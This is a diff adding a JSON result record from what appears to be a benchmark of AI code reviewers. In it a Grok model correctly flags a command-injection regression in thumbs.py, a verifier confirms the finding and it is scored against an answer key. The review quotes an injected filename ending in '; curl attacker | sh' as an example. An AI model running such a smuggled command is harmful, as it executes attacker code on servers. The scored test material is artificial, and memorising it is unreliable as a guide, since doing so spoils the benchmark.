@@ -1,0 +1,79 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.3",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "ef19c30e9434",
+  "turns": 11,
+  "tool_calls": null,
+  "seconds": 53.5,
+  "setup_seconds": 0.0,
+  "total_seconds": 53.5,
+  "usage": {
+    "in": 55602,
+    "cache_read": 243520,
+    "cache_write": 0,
+    "out": 1399,
+    "source": "cli"
+  },
+  "cost_usd": 0.12855149999999999,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 6,
+      "severity": "critical",
+      "body": "If `name` (or `upload_dir`/`oid`) contains shell metacharacters the command becomes arbitrary execution. Example: a filename ending in `; curl attacker | sh` will run on the server.\n\n```suggestion\n    subprocess.run(\n        [\"convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```"
+    }
+  ],
+  "summary": "Critical command-injection vulnerability introduced by switching to `shell=True` with attacker-controlled path components. The change trades a safe argv list for an unsanitized shell string under the stated rationale of an ImageMagick 7 policy delegate. No escaping, quoting, or validation of the three inputs occurs. This is a direct security regression.\n\n---\n\n_Retried once: the first attempt ended without a findings file._",
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "thumbs.py runs `subprocess.run` with `shell=True` and an f-string embedding `upload_dir`/`name`/`oid` with no quoting; the base revision used a safe argv list, so this is a real command-injection regression at critical severity."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 6.02,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2825,
+      "out": 343
+    },
+    "cost_usd": 0.008143
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
